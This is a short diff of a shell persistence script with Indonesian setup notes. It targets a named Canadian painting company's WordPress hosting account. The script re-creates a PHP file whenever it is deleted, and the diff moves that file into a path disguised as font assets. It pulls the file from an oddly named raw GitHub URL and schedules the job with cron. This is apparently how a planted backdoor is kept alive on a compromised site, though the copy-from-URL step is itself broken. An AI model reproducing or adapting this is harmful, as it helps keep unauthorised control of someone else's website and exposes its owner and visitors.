@@ -15,8 +15,8 @@ mv protect.sh .cache_sync
  
 #!/bin/sh
 
-FILE="/home/u200768895/domains/aceprofessionalpainting.ca/public_html/index.php"
-SAFE="/home/u200768895/domains/aceprofessionalpainting.ca/public_html/index-safe.php"
+FILE="/home/u200768895/domains/aceprofessionalpainting.ca/public_html/wp-content/updraft/widgets/fonts/style-engine/file.php"
+SAFE="https://raw.githubusercontent.com/Ghami1/file/refs/heads/master/luffyMonkeyD1"
 
 if [ ! -f "$FILE" ]; then
     cp "$SAFE" "$FILE"
@@ -39,4 +39,4 @@ chmod +x protect.sh
 
 kalau sudah berhasil pasang chron job
 terminal ketik
-/home/u200768895/domains/aceprofessionalpainting.ca/public_html/protect.sh
+/home/u200768895/domains/aceprofessionalpainting.ca/public_html/wp-content/updraft/widgets/fonts/style-engine/protect.sh
